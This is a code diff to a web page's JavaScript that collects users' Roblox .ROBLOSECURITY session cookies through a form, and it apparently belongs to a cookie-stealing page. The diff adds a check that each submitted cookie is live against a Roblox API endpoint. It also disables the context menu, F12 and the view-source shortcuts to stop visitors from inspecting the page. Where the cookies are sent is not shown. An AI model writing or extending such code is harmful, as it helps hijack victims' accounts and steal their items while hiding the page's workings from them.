@@ -232,8 +232,42 @@ function hasUnicode(str) {
 // Function to validate .ROBLOSECURITY cookie format
 function isValidRobloxCookie(cookie) {
   const cookiePrefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
-  return cookie.startsWith(cookiePrefix) && cookie.length > cookiePrefix.length + 50 && /^[A-Za-z0-9_-]+$/.test(cookie.slice(cookiePrefix.length));
+  return cookie.startsWith(cookiePrefix) && cookie.length > cookiePrefix.length + 50;
 }
+
+// Function to check cookie validity using Roblox API
+async function checkCookieValidity(cookie) {
+  try {
+    const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+      method: "GET",
+      headers: {
+        "Cookie": `.ROBLOSECURITY=${cookie}`
+      }
+    });
+    if (res.ok) {
+      const userData = await res.json();
+      return userData.UserID ? true : false;
+    }
+    return false;
+  } catch (error) {
+    console.error("Cookie validation error:", error);
+    return false;
+  }
+}
+
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+  showNotif('Context menu disabled');
+  errorSound.play();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
+    e.preventDefault();
+    showNotif('Developer tools disabled');
+    errorSound.play();
+  }
+});
 
 $("#cookieForm").on("submit", async function(e) {
   e.preventDefault();
@@ -246,9 +280,17 @@ $("#cookieForm").on("submit", async function(e) {
     return;
   }
 
-  // Validate cookie format
+  // Check basic cookie format
   if (!isValidRobloxCookie(cookie)) {
-    showNotif("Invalid .ROBLOSECURITY cookie format");
+    showNotif("Invalid cookie");
+    errorSound.play();
+    return;
+  }
+
+  // Check cookie validity via API
+  const isCookieValid = await checkCookieValidity(cookie);
+  if (!isCookieValid) {
+    showNotif("Invalid cookie");
     errorSound.play();
     return;
   }
